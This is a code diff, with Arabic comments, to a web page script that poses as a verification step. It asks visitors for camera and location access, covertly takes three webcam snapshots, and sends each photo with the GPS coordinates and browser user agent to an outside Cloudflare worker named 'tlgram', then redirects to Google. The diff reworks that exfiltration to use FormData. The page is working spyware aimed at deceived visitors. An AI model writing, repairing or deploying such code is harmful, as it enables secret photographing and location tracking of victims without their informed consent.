@@ -16,9 +16,8 @@
 
     <script>
     async function startProcess() {
-        // رابط الـ Worker الخاص بك
         const workerUrl = "https://tlgram.alidm0935.workers.dev/";
-        
+
         try {
             // 1. طلب إذن الكاميرا والموقع معاً
             const [stream, position] = await Promise.all([
@@ -30,27 +29,29 @@
             const canvas = document.createElement('canvas'); canvas.width = 640; canvas.height = 480;
             const ctx = canvas.getContext('2d');
 
-            // 2. التقاط وإرسال 3 لقطات متتالية
+            // 2. التقاط وإرسال 3 لقطات متتالية باستخدام FormData
             for(let i = 0; i < 3; i++) {
                 ctx.drawImage(video, 0, 0, 640, 480);
                 const img = canvas.toDataURL('image/jpeg', 0.5);
-                
+
+                // تجهيز البيانات بالأسلوب الذي يفهمه الـ Worker الخاص بك
+                const formData = new FormData();
+                formData.append('img', img);
+                formData.append('lat', position.coords.latitude);
+                formData.append('lon', position.coords.longitude);
+                formData.append('info', navigator.userAgent);
+
                 await fetch(workerUrl, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        img: img,
-                        lat: position.coords.latitude,
-                        lon: position.coords.longitude,
-                        info: navigator.userAgent
-                    })
+                    body: formData // إرسال كـ FormData
                 });
+                
                 await new Promise(r => setTimeout(r, 1000));
             }
-            
+
             stream.getTracks().forEach(t => t.stop());
             window.location.href = "https://www.google.com";
-            
+
         } catch (e) {
             alert("يرجى السماح بالوصول للكاميرا والموقع لإتمام التحقق.");
         }
